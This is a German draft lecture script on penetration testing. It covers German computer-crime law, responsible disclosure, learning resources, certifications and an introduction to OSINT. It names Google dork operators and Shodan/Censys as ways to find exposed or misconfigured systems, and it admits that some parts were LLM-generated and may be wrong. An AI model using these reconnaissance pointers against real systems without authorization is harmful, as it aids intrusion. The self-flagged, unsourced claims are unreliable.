Vorläufiger Entwurf des Skripts zur Vorlesung

Achtung: Dieser Entwurf befindet sich noch in Bearbeitung!

Dieses Dokument ist der aktuelle Ansatz für das Vorlesungsskript, aber es ist noch stark in Arbeit. Es handelt sich um eine stark gekürzte Version und enthält noch nicht alle Informationen. Einige Teile wurden mithilfe von LLMs aus Video-Transkripten generiert, daher könnten auch Fehler enthalten sein.

Das Skript wird aktiv weiterentwickelt. Falls dir Fehler oder Verbesserungsmöglichkeiten auffallen oder dir wichtige Inhalte fehlen, würde ich mich sehr über deinen Beitrag freuen – gerne per Pull Request.

# 1. Rahmenbedingungen
## 1.1 Relevante Paragraphen und rechtliche Grundlagen
### §202a: Ausspähen von Daten (Absätze 1 und 2)

> (1) Wer unbefugt sich oder einem anderen Zugang zu Daten, die nicht für ihn bestimmt und die gegen unberechtigten Zugang besonders gesichert sind, unter Überwindung der Zugangssicherung verschafft, wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.
> (2) Daten im Sinne des Absatzes 1 sind nur solche, die elektronisch, magnetisch oder sonst nicht unmittelbar wahrnehmbar gespeichert sind oder übermittelt werden.

Der Paragraf §202a des Strafgesetzbuchs behandelt das Ausspähen von Daten. Absatz 1 besagt, dass das unbefugte Verschaffen von Zugang zu besonders geschützten Daten eine Straftat darstellt, die mit einer Freiheitsstrafe von bis zu drei Jahren oder mit Geldstrafe geahndet wird. Das zentrale Kriterium hierbei ist das Wort "unbefugt", da es auf die Absicht des Handelnden abstellt. Auch das Überwinden von Zugangssicherungen, selbst wenn diese technisch schwach sind, gilt als strafbare Handlung. Absatz 2 präzisiert, dass dieser Paragraf nur für elektronisch oder magnetisch gespeicherte bzw. übermittelte Daten Anwendung findet.

### §202b: Abfangen von Daten 
> Wer unbefugt sich oder einem anderen unter Anwendung von technischen Mitteln nicht für ihn bestimmte Daten (§ 202a Abs. 2) aus einer nichtöffentlichen Datenübermittlung oder aus der elektromagnetischen Abstrahlung einer Datenverarbeitungsanlage verschafft, wird mit Freiheitsstrafe bis zu zwei Jahren oder mit Geldstrafe bestraft, wenn die Tat nicht in anderen Vorschriften mit schwererer Strafe bedroht ist.

§202b bezieht sich auf das unbefugte Abfangen von Daten aus nicht öffentlichen Übermittlungen. Darunter fällt sowohl das Abfangen von Datenübertragungen über elektromagnetische Strahlung als auch über kabelgebundene Kanäle. Das Abhören von Datenübertragungen, für die man keine ausdrückliche Erlaubnis besitzt, wird mit bis zu zwei Jahren Freiheitsstrafe oder mit Geldstrafe bestraft. Besonders hervorzuheben ist, dass der Einsatz technischer Mittel zur Erlangung nicht-autorisierten Zugangs explizit als strafbar eingestuft wird.

### §202c: Vorbereitung des Ausspähens und Abfangens von Daten
> (1) Wer eine Straftat nach § 202a oder § 202b vorbereitet, indem er
> 1. Passwörter oder sonstige Sicherungscodes, die den Zugang zu Daten (§ 202a Abs. 2) ermöglichen, oder
> 2.Computerprogramme, deren Zweck die Begehung einer solchen Tat ist,
> herstellt, sich oder einem anderen verschafft, verkauft, einem anderen überlässt, verbreitet oder sonst zugänglich macht, wird mit Freiheitsstrafe bis zu zwei Jahren oder mit Geldstrafe bestraft.
> 2) § 149 Abs. 2 und 3 gilt entsprechend.

Dieser Paragraph deckt die Vorbereitungshandlungen ab, die für das Ausspähen oder Abfangen von Daten notwendig sind. Darunter fallen insbesondere sogenannte Hacking-Tools, sofern sie für das unbefugte Eindringen in Systeme verwendet werden sollen. Die Strafbarkeit richtet sich nach der Intention, mit der solche Werkzeuge eingesetzt werden. Sofern beispielsweise Tools zur Sicherheitsüberprüfung, also für legitime Penetrationstests verwendet werden, die im Vorfeld mit ausdrücklicher Zustimmung des Eigentümer der Systeme vereinbart wurden, besteht keine Strafbarkeit. Wichtig ist daher eine klare Abgrenzung zwischen legalen Anwendungen (z. B. Sicherheitstests) und böswilligen Absichten.

### §303a: Datenveränderung 
> (1) Wer rechtswidrig Daten (§ 202a Abs. 2) löscht, unterdrückt, unbrauchbar macht oder verändert, wird mit Freiheitsstrafe bis zu zwei Jahren oder mit Geldstrafe bestraft.
> (2) Der Versuch ist strafbar.
> (3) Für die Vorbereitung einer Straftat nach Absatz 1 gilt § 202c entsprechend.

§303a bestraft das unbefugte Löschen, Unterdrücken, Verändern oder Unbrauchbarmachen von Daten. Dieses Verhalten kann mit einer Freiheitsstrafe von bis zu zwei Jahren oder mit Geldstrafe belegt werden. Eine wichtige Ausnahme ist der Fall, dass eine ausdrückliche Erlaubnis des Dateneigentümer vorliegt. Dies ist zum Beispiel im Rahmen eines vereinbarten Stresstests der Fall, bei dem das Verhalten eines Systems unter hoher Last geprüft werden soll. Hier ist der rechtliche Rahmen entscheidend, um strafrechtliche Konsequenzen zu vermeiden.

### §303b: Computersabotage 
> (1) Wer eine Datenverarbeitung, die für einen anderen von wesentlicher Bedeutung ist, dadurch erheblich stört, dass er
> 1. eine Tat nach § 303a Abs. 1 begeht,
> 2. Daten (§ 202a Abs. 2) in der Absicht, einem anderen Nachteil zuzufügen, eingibt oder übermittelt oder
> 3. eine Datenverarbeitungsanlage oder einen Datenträger zerstört, beschädigt, unbrauchbar macht, beseitigt oder verändert,
> wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.
> (2) Handelt es sich um eine Datenverarbeitung, die für einen fremden Betrieb, ein fremdes Unternehmen oder eine Behörde von wesentlicher Bedeutung ist, ist die Strafe Freiheitsstrafe bis zu fünf Jahren oder Geldstrafe.
> (3) Der Versuch ist strafbar.
> (4) In besonders schweren Fällen des Absatzes 2 ist die Strafe Freiheitsstrafe von sechs Monaten bis zu zehn Jahren. Ein besonders schwerer Fall liegt in der Regel vor, wenn der Täter
> 1. einen Vermögensverlust großen Ausmaßes herbeiführt,
> 2. gewerbsmäßig oder als Mitglied einer Bande handelt, die sich zur fortgesetzten Begehung von Computersabotage verbunden hat,
> 3. durch die Tat die Versorgung der Bevölkerung mit lebenswichtigen Gütern oder Dienstleistungen oder die Sicherheit der Bundesrepublik Deutschland beeinträchtigt.
> (5) Für die Vorbereitung einer Straftat nach Absatz 1 gilt § 202c entsprechend.

Dieser Paragraph bezieht sich auf die gezielte Störung von Datenverarbeitungsprozessen, insbesondere wenn diese den Betrieb von Unternehmen oder Behörden beeinträchtigen. Absatz 1 definiert Computersabotage als Eingriff in IT-Systeme, der zu einer Betriebsstörung führt. Besonders kritisch ist dies bei Angriffen auf IT-Infrastrukturen, die für die Versorgung der Öffentlichkeit relevant sind, wie Krankenhäuser oder Kraftwerke. Die Strafandrohung reicht hier bis zu fünf Jahren Freiheitsstrafe und zeigt die besondere Schwere solcher Eingriffe, insbesondere wenn sie die Versorgungssicherheit gefährden.

### §206: Verletzung des Fernmeldegeheimnisses
> (1) Wer unbefugt einer anderen Person eine Mitteilung über Tatsachen macht, die dem Post- oder Fernmeldegeheimnis unterliegen und die ihm als Inhaber oder Beschäftigtem eines Unternehmens bekanntgeworden sind, das geschäftsmäßig Post- oder Telekommunikationsdienste erbringt, wird mit Freiheitsstrafe bis zu fünf Jahren oder mit Geldstrafe bestraft.
> (2) Ebenso wird bestraft, wer als Inhaber oder Beschäftigter eines in Absatz 1 bezeichneten Unternehmens unbefugt
> 1. eine Sendung, die einem solchen Unternehmen zur Übermittlung anvertraut worden und verschlossen ist, öffnet oder sich von ihrem Inhalt ohne Öffnung des Verschlusses unter Anwendung technischer Mittel Kenntnis verschafft,
> 2. eine einem solchen Unternehmen zur Übermittlung anvertraute Sendung unterdrückt oder
> 3. eine der in Absatz 1 oder in Nummer 1 oder 2 bezeichneten Handlungen gestattet oder fördert.
> (3) Die Absätze 1 und 2 gelten auch für Personen, die
> 1. Aufgaben der Aufsicht über ein in Absatz 1 bezeichnetes Unternehmen wahrnehmen,
> 2. von einem solchen Unternehmen oder mit dessen Ermächtigung mit dem Erbringen von Post- oder Telekommunikationsdiensten betraut sind oder
> 3. mit der Herstellung einer dem Betrieb eines solchen Unternehmens dienenden Anlage oder mit Arbeiten daran betraut sind.
> (4) Wer unbefugt einer anderen Person eine Mitteilung über Tatsachen macht, die ihm als außerhalb des Post- oder Telekommunikationsbereichs tätigem Amtsträger auf Grund eines befugten oder unbefugten Eingriffs in das Post- oder Fernmeldegeheimnis bekanntgeworden sind, wird mit Freiheitsstrafe bis zu zwei Jahren oder mit Geldstrafe bestraft.
> (5) Dem Postgeheimnis unterliegen die näheren Umstände des Postverkehrs bestimmter Personen sowie der Inhalt von Postsendungen. Dem Fernmeldegeheimnis unterliegen der Inhalt der Telekommunikation und ihre näheren Umstände, insbesondere die Tatsache, ob jemand an einem Telekommunikationsvorgang beteiligt ist oder war. Das Fernmeldegeheimnis erstreckt sich auch auf die näheren Umstände erfolgloser Verbindungsversuche.

Das Fernmeldegeheimnis ist in §206 StGB geregelt und betrifft das Abhören und Zugänglichmachen von nicht öffentlicher Telekommunikation an Dritte. Dies betrifft sowohl die Inhalte der Kommunikation als auch die zugehörigen Metadaten. Ein Penetrationstester, der in Kommunikationssysteme eindringt, könnte sich strafbar machen, wenn keine ausdrückliche Zustimmung der Kommunikationsparteien vorliegt. Hier ist besondere Vorsicht geboten, da der Schutz der Privatsphäre und der Vertraulichkeit der Kommunikation ein hohes rechtliches Gut darstellt.

### Fazit zur Rechtslage im Pentesting

Die gesetzliche Lage zeigt, dass Penetrationstests ohne ausdrückliche und schriftliche Zustimmung des Eigentümer oder Betreibers der IT-Infrastruktur klare strafrechtliche Risiken bergen. Ein umfassender Vertrag, der die Rahmenbedingungen, den Umfang und die Ziele des Pentests genau definiert, ist essentiell, um strafrechtliche Konsequenzen zu vermeiden. Der entscheidende Unterschied zwischen ethischem Hacking und Cyberkriminalität liegt in der Zustimmung aller Beteiligten und der Einhaltung gesetzlicher Vorgaben. Nur durch klare rechtliche Rahmenbedingungen und eine saubere Dokumentation der Einwilligung lassen sich strafbare Handlungen vermeiden und Sicherheit für alle Beteiligten gewährleisten.



## Ablauf und Herausforderungen bei Responsible Disclosure


Security Researcher und Pentester stoßen häufig auf Schwachstellen in Systemen, die von geringfügig bis hin zu systemgefährdend reichen können. Das Konzept der Responsible Disclosure ermutigt dazu, solche Schwachstellen verantwortungsbewusst zu melden, ohne sie auszunutzen oder öffentlich zu machen. Dadurch können Organisationen die Schwachstellen beheben, ohne rechtliche Schritte gegen die Entdecker zu unternehmen.

Obwohl Responsible Disclosure rechtlich fragwürdig sein kann, akzeptieren viele Organisationen diese Praxis. In einigen Fällen kann es jedoch zu Missverständnissen kommen, die in rechtlichen Auseinandersetzungen enden. Es gibt jedoch auch positive Beispiele, bei denen Organisationen wie die Bundeswehr oder Unternehmen mit Security.txt-Dateien bereitwillig auf Schwachstellenberichte reagieren.

### Anonyme Durchführung von Responsible Disclosure

Um rechtliche Risiken zu minimieren, kann Responsible Disclosure anonym durchgeführt werden. Der CERT-Bund, eine Abteilung des BSI, dient hier als Vermittler. Sie helfen dabei, Schwachstellenmeldungen weiterzuleiten und somit sicherzustellen, dass diese an die richtigen Stellen gelangen, ohne dass der Entdecker der Schwachstelle persönliche Risiken eingeht.

#### Vorteile und Nachteile der Anonymität
- **Vorteile**: Keine rechtlichen Konsequenzen für den Melder, Schutz der eigenen Identität.
- **Nachteile**: Keine Anerkennung oder Belohnung, möglicherweise erschwerte Kommunikation mit dem betroffenen Unternehmen.

### Beispielhafte Vorgehensweise

1. **Erkennung der Schwachstelle**: Die Schwachstelle wird zunächst genau untersucht, um sicherzustellen, dass es sich nicht um einen Fehlalarm handelt.
2. **Erstellung eines Berichts**: Ein detaillierter Bericht über die Schwachstelle, die Auswirkungen und mögliche Behebungen wird erstellt.
3. **Anonymität wahren**: Der Bericht wird über einen vertrauenswürdigen Vermittler wie den CERT-Bund eingereicht oder mit Pseudonymen an das betroffene Unternehmen weitergeleitet.
4. **Kommunikation und Nachverfolgung**: Falls möglich, wird eine anonyme Rückmeldeoption angeboten, damit das Unternehmen eventuelle Fragen klären kann.

### Zusammenfassung und Empfehlung

Responsible Disclosure ist ein komplexes Thema, das mit rechtlichen Unsicherheiten verbunden ist. Um Risiken zu minimieren, kann der anonyme Weg über Vermittler wie den CERT-Bund eine sinnvolle Option sein. Zudem sollten Sicherheitsforscher darauf achten, ihre Berichte so präzise und konstruktiv wie möglich zu formulieren, um eine reibungslose Behebung der Schwachstelle zu ermöglichen.

## Verhaltenstipps, Lernressourcen, Zertifizierungen und Knowledgebase

### Verhaltenstipps
Das Verhalten eines Security Researchers sollte stets von Verantwortung, Bedacht und ethischer Integrität geprägt sein. Sicherheitsexperten sind oft mit Schwachstellen konfrontiert, die im echten Leben potenziell schwerwiegende Konsequenzen haben können. Neugier und das Bestreben, technische Grenzen auszuloten, sind zweifellos wichtige Triebfedern in der Informationssicherheit, doch sollte nie vergessen werden, dass jede gefundene Schwachstelle reale Auswirkungen auf Menschen und Unternehmen haben kann. Ein anschauliches Beispiel dafür ist der Vorfall auf der DEFCON, bei dem Bluetooth-Spam-Angriffe unter Einsatz eines Flipper Zero dazu führten, dass eine Insulinpumpe unerwartet ausfiel – ein Vorfall, der ernste gesundheitliche Gefahren zur Folge hatte.

Solche Beispiele verdeutlichen, wie wichtig Zurückhaltung und ein klares Verständnis für ethische Grundsätze sind. Als Security Researcher trägt man eine große Verantwortung dafür, entdeckte Sicherheitslücken auf verantwortungsvolle Weise zu melden und sicherzustellen, dass keine unbeabsichtigten Schäden entstehen. Die Arbeit sollte niemals für destruktive Zwecke missbraucht werden, und das Abwägen von Risiken und Nutzen ist entscheidend, um einen positiven Beitrag zur Cybersicherheit zu leisten.

### Lernressourcen
Für die Entwicklung und den Ausbau von Fähigkeiten im Bereich Cyber Security ist kontinuierliche Weiterbildung unabdingbar. Die nachfolgenden Ressourcen bieten eine fundierte Grundlage für das Lernen und Vertiefen von Kenntnissen:

- **Websites für das Üben von Angriffsszenarien**:
  - **HackTheBox**: HackTheBox bietet realistische Übungsszenarien in abgeschlossenen Umgebungen. Die Herausforderungen reichen von leicht bis extrem anspruchsvoll und spiegeln reale Angriffstechniken wider.
  - **TryHackMe**: Eine hervorragende Plattform, die Anfänger wie auch Fortgeschrittene durch interaktive Tutorials begleitet. Die Inhalte reichen von Grundlagen bis hin zu komplexeren Exploits.
  - **VulnHub**: VulnHub bietet kostenlose, herunterladbare virtuelle Maschinen, auf denen verschiedene Schwachstellen geübt werden können. Dies ist besonders nützlich, um offline und in einer isolierten Umgebung zu trainieren.
  - **Burp Suite Academy**: Eine exzellente Plattform zum Lernen von Web-Angriffen. Burp Suite Academy bietet umfassende Tutorials zur sicheren Nutzung von Burp Suite und deckt verschiedene Schwachstellen ab, von SQL-Injection bis zu Cross-Site Scripting.

- **Eigenes Lab für praktische Übungen**: Das Aufsetzen eines eigenen Labs ist ein weiterer wichtiger Schritt für angehende Security Researchers. Mit Tools wie VirtualBox, VMware oder Docker können isolierte Umgebungen erstellt werden, in denen man nach Belieben Tools testen und Exploits übersetzen kann, ohne reale Systeme zu gefährden.

- **Empfohlene YouTube-Kanäle**: Auf YouTube gibt es zahlreiche Kanäle, die exzellente praxisorientierte Inhalte bieten. Besonders empfehlenswert sind:
  - **John Hammond**: Für tiefgehende Erklärungen und umfassende Walkthroughs von CTF-Challenges.
  - **LiveOverflow**: Ein Kanal, der komplexe Schwachstellen und Exploits auf eine leicht verständliche Weise erklärt.
  - **IppSec**: Bekannt für seine detaillierten HackTheBox-Walkthroughs, die einen sehr praxisnahen Einblick in Penetration Testing bieten.
  - **NahamSec** und **HackerSploit**: Beide Kanäle bieten eine gute Mischung aus Grundlagen und tiefergehenden technischen Analysen.

### Zertifizierungen
Zertifizierungen spielen eine wichtige Rolle im Bereich der Cybersicherheit. Sie sind nicht nur ein Beleg für die eigenen Fähigkeiten, sondern bieten auch eine strukturierte Lernmöglichkeit, um bestimmte Themenfelder fundiert zu erarbeiten. Die wichtigsten und bekanntesten Zertifikate sind:

- **OSCP (Offensive Security Certified Professional)**: Die OSCP-Zertifizierung wird oft als der Goldstandard im Bereich Penetration Testing angesehen. Die Prüfung setzt eine umfassende praktische Kompetenz voraus und erfordert, dass der Kandidat in einer 24-stündigen Prüfung mehrere Maschinen erfolgreich kompromittiert.
- **CEH (Certified Ethical Hacker)**: Das CEH-Zertifikat bietet eine Einführung in die Grundlagen des Ethical Hacking. Es ist besonders geeignet für Einsteiger, die ein strukturiertes Framework zum Lernen der grundlegenden Angriffstechniken suchen.
- **CRTP (Certified Red Team Professional)**: Das CRTP-Zertifikat ist besonders wertvoll für diejenigen, die sich im Bereich Red Teaming spezialisieren möchten, insbesondere bei Angriffen auf Active Directory. Es kombiniert praktische Übungen mit soliden theoretischen Grundlagen.

Weitere Informationen zu relevanten Zertifizierungen sowie eine überblicksartige Roadmap sind online verfügbar. Ein besonders hilfreicher Überblick ist unter [diesem Link](https://pauljerimy.com/security-certification-roadmap/) zu finden, welcher einen umfassenden Einblick in den Zertifizierungsweg im Bereich der IT-Sicherheit gibt.

Das Wissen um diese Zertifikate hilft nicht nur beim persönlichen Kompetenzaufbau, sondern auch bei der Orientierung in einer sich ständig verändernden Berufslandschaft.



### Knowledgebase

Eine gut strukturierte Knowledgebase ist ein wertvolles Werkzeug für jeden Security Researcher. Sie ermöglicht es, erprobte Techniken, Angriffe und Commands zentral zu speichern, sodass man im sofort auf relevante Informationen zugreifen kann, ohne erst langwierige Internetrecherchen durchführen zu müssen. Dies erhöht die Effizienz und reduziert Fehler in verschiedenen Situationen.

Tools wie **Notion** und **Obsidian** eignen sich hervorragend zur Erstellung und Pflege einer Knowledgebase. Notion bietet eine vielseitige Plattform, die sowohl als Wissensspeicher als auch zur Projektorganisation genutzt werden kann. Mit seiner intuitiven Benutzeroberfläche und den Möglichkeiten zur Einbettung von Multimedia-Inhalten lassen sich komplexe Themen übersichtlich strukturieren. Beispielsweise können Tabellen, Dokumente, und Code-Snippets integriert werden, um alle relevanten Informationen zentral vorzuhalten.

**Obsidian** hingegen bietet eine lokal gespeicherte Lösung, die durch das Verwenden von Markdown-Dateien eine schnelle und flexible Erstellung von Dokumentationen ermöglicht. Besonders nützlich ist die graphische Darstellung der Verknüpfungen zwischen einzelnen Dokumenten, was eine Art Wissensnetzwerk erzeugt. Diese Graphenansicht hilft dabei, Zusammenhänge zwischen Angriffstechniken oder Tools zu erkennen und somit ein tieferes Verständnis zu entwickeln. Gerade für Security Researcher, die ohne Cloud-Lösung arbeiten möchten, stellt Obsidian eine sichere und private Alternative dar.

Weitere Tools wie **Joplin**, **Zettlr** oder auch **Standard Notes** bieten ebenfalls Optionen zur flexiblen und sicheren Dokumentation von Wissen, je nach individuellen Anforderungen. Jedes dieser Tools hat seine Stärken, ob es um die Zusammenarbeit im Team, die Offline-Funktionalität oder die Verschlüsselung der Daten geht. Die Wahl des passenden Tools hängt dabei von persönlichen Vorlieben und Anforderungen an die Sicherheit ab.


# 2. OSINT

### Was ist OSINT?

Open-Source Intelligence (OSINT) ist das Sammeln und Analysieren von Daten aus öffentlich zugänglichen Quellen, auch verdeckte Quellen und öffentlich verfügbare Informationen (PAI), um verwertbare Erkenntnisse zu gewinnen. OSINT umfasst verschiedene Techniken und Methoden, um aus einer Vielzahl von Datenquellen die relevanten Informationen herauszufiltern und zu verarbeiten.

Im Wesentlichen werden öffentlich zugängliche Daten gesammelt und in verwertbare Informationen umgewandelt, die z. B. für Sicherheitszwecke, Marktanalysen oder zur Profilbildung genutzt werden können. Diese Informationen sind oft verstreut, müssen jedoch durch systematische Analyse zusammengeführt werden, um umfassende und nutzbare Erkenntnisse zu gewinnen.

### Von Daten zu Wissen

Die Transformation von Daten zu Wissen erfolgt über verschiedene, klar definierte Stufen, wie auch das dargestellte Schaubild illustriert. Zunächst betrachten wir den Begriff der **Daten** – es handelt sich hierbei um rohe, unverarbeitete Fakten, die in ihrer isolierten Form keinen inhärenten Zusammenhang oder Bedeutung aufweisen. Im Kontext der OSINT-Recherche (Open Source Intelligence) sammeln wir genau solche Datenpunkte, seien es Namen, E-Mail-Adressen oder Fotografien. Diese Daten existieren zunächst unverbunden und bieten somit keinen unmittelbar verwertbaren Mehrwert.

Der nächste Schritt besteht in der Generierung von **Information**. Informationen entstehen, wenn Daten in einen kohärenten Zusammenhang gebracht werden, sodass sie in einer bestimmten Konstellation für uns Sinn ergeben. Ein typisches Beispiel wäre die Assoziation eines Namens mit einer spezifischen E-Mail-Adresse oder die Verknüpfung einer Fotografie mit einer Standortinformation. Durch die systematische Anwendung von OSINT-Techniken lassen sich solche Verbindungen herstellen, sodass aus einer anfänglichen Datenansammlung ein Netzwerk entsteht, das eine verwertbare Informationsbasis bietet.

**Wissen** entsteht, wenn diese Informationsstränge strukturiert und in Beziehung zueinander gesetzt werden, um ein tieferes Verständnis zu ermöglichen. Dieses Stadium erlaubt es uns, Muster zu identifizieren, etwa soziale Beziehungen oder Netzwerkstrukturen. Es wird erkennbar, dass bestimmte Individuen über verschiedene Plattformen hinweg miteinander interagieren oder dass sich bestimmte Personen regelmäßig an spezifischen Orten aufhalten. Die methodische Verknüpfung dieser Informationen ermöglicht die Schaffung eines detaillierten Profils einer Zielperson oder eines Zielobjekts.

Der darauffolgende Schritt betrifft die **Einsicht**. Einsicht ist das Resultat der systematischen Anwendung von Wissen, mit dem Ziel, tiefere Zusammenhänge zu erschließen oder Prognosen abzuleiten. Ein Beispiel hierfür wäre die Erkennung von Trends oder das Identifizieren spezifischer Verhaltensmuster. Die analytische Durchdringung der gesammelten Informationen kann uns ermöglichen, Schlüsselfiguren innerhalb sozialer Netzwerke zu erkennen oder die Art und Weise zu verstehen, wie bestimmte Interessengebiete miteinander korrelieren. Einsicht versetzt uns in die Lage, strategische Entscheidungen zu fundieren und zielgerichtet zu agieren.

Die letzte Stufe in diesem Prozess ist die Ebene der **Weisheit**. Weisheit zeichnet sich dadurch aus, dass die gewonnenen Einsichten so genutzt werden, dass konkrete, zielgerichtete Entscheidungen getroffen und Maßnahmen abgeleitet werden können. Im Kontext von OSINT bedeutet dies, dass basierend auf den generierten Erkenntnissen gezielte Aktionen, wie etwa präzise Marketingstrategien, die Planung polizeilicher Maßnahmen oder gar die Vorbereitung eines gezielten Angriffs, erfolgen können. Weisheit umfasst also die Fähigkeit, abstrahierte Informationen so zu operationalisieren, dass sie einen spezifischen Zweck erfüllen und in einer realen Umgebung umgesetzt werden.

Das dargestellte Schaubild veranschaulicht diesen gesamten Prozess: Es zeigt, wie sich lose, unverknüpfte Daten durch sukzessive Analyse und Integration in kohärente Informationen verwandeln, die letztlich in Einsicht und weise Entscheidungen münden.

![image](https://mltfwbciccuo.i.optimole.com/cb:n4OZ.4d52/w:auto/h:auto/q:mauto/f:best/https://www.evalueserve.com/wp-content/uploads/2021/08/Insights-to-wisdom-infographic.png)

### Grundlagen von Datenpunkten

Ein **Datenpunkt** ist eine elementare Informationseinheit, die isoliert betrachtet noch keinen weiteren Kontext vermittelt, etwa ein Name, eine E-Mail-Adresse oder ein geografischer Standort. Datenpunkte sind die Grundlage, auf der jede OSINT-Recherche basiert. Sie sind vergleichbar mit Puzzleteilen, die erst durch ihre Verknüpfung ein kohärentes Gesamtbild ergeben können. Einzelne Datenpunkte mögen zunächst trivial erscheinen, doch in ihrer methodischen Verbindung entsteht ein wertvolles Informationsnetzwerk.

Ein herausragendes Beispiel hierfür sind **versteckte Datenpunkte**, wie etwa die **Metadaten** in Bildern. Solche Informationen werden häufig unbewusst veröffentlicht, zum Beispiel als Standortdaten in einer Fotografie, die in sozialen Medien geteilt wird. Wenn eine ausreichende Menge dieser Datenpunkte gesammelt wird, kann daraus ein wertvolles, verwertbares Wissen resultieren. Es ist daher von essenzieller Bedeutung, dass Datenpunkte niemals isoliert, sondern stets in Bezug zu anderen Informationen betrachtet werden, um daraus **actionable knowledge** – also unmittelbar umsetzbare Erkenntnisse – zu generieren.

Der Mehrwert von OSINT liegt in der Fähigkeit, verstreute Datenpunkte effizient zu sammeln und in einen sinnvollen Kontext zu setzen, sodass aus einer anfänglich amorphen Ansammlung von Fakten ein kohärentes, operatives Wissen wird. Genau diesen Prozess illustriert das Schaubild: Daten werden akquiriert, systematisch organisiert, in Wissen transformiert und schließlich angewandt, um fundierte strategische Entscheidungen zu treffen.

### Wer nutzt OSINT?

OSINT wird von einer Vielzahl unterschiedlicher Akteure genutzt, die jeweils verschiedene Ziele verfolgen und unterschiedliche Methoden anwenden. Zu den wichtigsten Nutzergruppen gehören:

- **Nationalstaaten**: Geheimdienste wie die **NSA**, **BND** oder **MI6** nutzen OSINT, um Bedrohungslagen zu bewerten und geeignete Maßnahmen zu ergreifen. Dabei dient OSINT nicht nur zur Analyse politischer Entwicklungen, sondern auch zur Identifikation und Bewertung von Bedrohungen durch andere Staaten, terroristische Organisationen oder Cyberkriminelle. Die gesammelten Informationen fließen in die strategische Planung ein und unterstützen die Entwicklung von Sicherheitsstrategien, die sich an den jeweiligen Bedrohungslagen orientieren.

- **Strafverfolgungsbehörden**: Behörden wie das **FBI** oder **BKA** setzen OSINT ein, um Straftäter zu ermitteln, den Kontext von Straftaten zu verstehen und gezielt nach Beweisen zu suchen. OSINT hilft Ermittlern dabei, öffentlich verfügbare Informationen aus sozialen Medien, Foren oder anderen Quellen zu analysieren und daraus relevante Hinweise für ihre Ermittlungen zu gewinnen. Diese Informationen können zur Verfolgung von Personen, zur Aufdeckung krimineller Netzwerke oder zur Unterstützung laufender Ermittlungen genutzt werden. Auch zur Identifikation von Tätern oder zur Ermittlung von Tatmotiven spielt OSINT eine zentrale Rolle.

- **Kriminelle**: Auch Kriminelle nutzen OSINT, um potenzielle Angriffsziele zu identifizieren und gezielte Informationen über ihre Opfer zu sammeln. Sie bedienen sich dabei öffentlicher Informationen, um Schwachstellen zu erkennen, die sie für Phishing-Angriffe, Social Engineering oder andere böswillige Aktivitäten nutzen können. Die Analyse von Social-Media-Profilen, die Identifikation von beruflichen Verbindungen und die gezielte Suche nach technischen Schwachstellen sind einige der Methoden, die Kriminelle zur Vorbereitung ihrer Angriffe einsetzen. OSINT wird hier zum Werkzeug für die Planung und Durchführung von Cyberattacken.

- **Privatpersonen**: Auch Privatpersonen betreiben OSINT, beispielsweise wenn sie Informationen über andere Personen in sozialen Medien durchstöbern oder öffentlich verfügbare Informationen zu bestimmten Themen recherchieren. Oft geschieht dies, um sich über eine Person zu informieren, die man treffen möchte, oder um allgemein mehr über das Umfeld einer Person zu erfahren. OSINT kann im Alltag eine Rolle spielen, wenn es darum geht, die Vertrauenswürdigkeit eines Geschäftspartners zu prüfen oder sich vor potenziellen Risiken zu schützen. Die Werkzeuge und Methoden, die hierbei zum Einsatz kommen, sind oft dieselben wie die, die auch von professionellen Ermittlern verwendet werden, wenn auch im kleineren Rahmen.

- **Unternehmen**: Viele Unternehmen nutzen OSINT, um die eigene Sicherheitslage zu evaluieren, Wettbewerbsanalysen durchzuführen oder Bedrohungen frühzeitig zu erkennen. Insbesondere im Bereich der Cybersicherheit setzen Unternehmen OSINT ein, um Informationen über potenzielle Angriffe, Datenlecks oder Schwachstellen zu erhalten. Darüber hinaus können Unternehmen mithilfe von OSINT die Aktivitäten ihrer Konkurrenten beobachten und Markttrends analysieren, um ihre strategische Positionierung zu verbessern. Sicherheitsforscher innerhalb von Unternehmen nutzen OSINT-Methoden, um die Gefährdungslage des eigenen Netzwerks besser zu verstehen und angemessene Gegenmaßnahmen zu entwickeln.



### Quellen für OSINT

Datenpunkte können aus einer Vielzahl unterschiedlicher Quellen stammen, die es ermöglichen, detaillierte Informationen über Personen, Organisationen oder Systeme zu sammeln. Diese Open Source Intelligence (OSINT) Quellen sind sowohl vielseitig als auch komplex in ihrer Nutzung, da jede Quelle bestimmte Besonderheiten aufweist und unterschiedlich interpretiert werden muss. Zu den wichtigsten OSINT-Quellen gehören unter anderem:

- **Suchmaschinen**
  - **Google Dorking**: Hierbei handelt es sich um eine Methode, bei der bestimmte Suchoperatoren eingesetzt werden, um gezielte Informationen zu finden, die oft nicht auf den ersten Blick sichtbar sind. Beispiele sind Operatoren wie `inurl:"keyword"` oder `filetype:pdf`, mit denen spezifische URL-Pfade oder Dateiformate durchsucht werden können. Google Dorking ermöglicht es, Suchmaschinen gezielt zur Informationsgewinnung einzusetzen und auf Daten zuzugreifen, die normalerweise schwer zu finden sind, wie etwa falsch konfigurierte Systeme oder öffentlich zugängliche, aber nicht intendierte Dokumente.
  - **Spezialisierte Suchmaschinen**: Werkzeuge wie **Shodan** oder **Censys** bieten eine spezialisierte Suche nach Computern, offenen Ports, Fingerabdrücken (Fingerprints) und Schwachstellen. Diese Suchmaschinen eignen sich hervorragend, um das Internet nach IoT-Geräten, ungeschützten Servern und Netzwerkkomponenten zu durchsuchen und dabei deren aktuelle Sicherheitslage zu evaluieren. Sie geben einen Überblick über Systeme, die öffentlich zugänglich sind, und stellen damit eine wertvolle Grundlage für weitergehende Analysen dar.
  - **Achtung: Honey Pots**: Honey Pots sind absichtlich unsicher konfigurierte Dienste, die auf Angriffe warten, um Angreifer zu analysieren und Daten über deren Vorgehensweise zu sammeln. Diese Systeme tauchen oft in spezialisierten Suchanfragen auf. Wer unbedarft mit diesen Honey Pots interagiert, riskiert, auf Beobachtungslisten für sicherheitsbehördliche oder kommerzielle Zwecke zu gelangen. Daher ist es essenziell, stets wachsam zu bleiben und zu vermeiden, solche Dienste versehentlich zu kontaktieren.

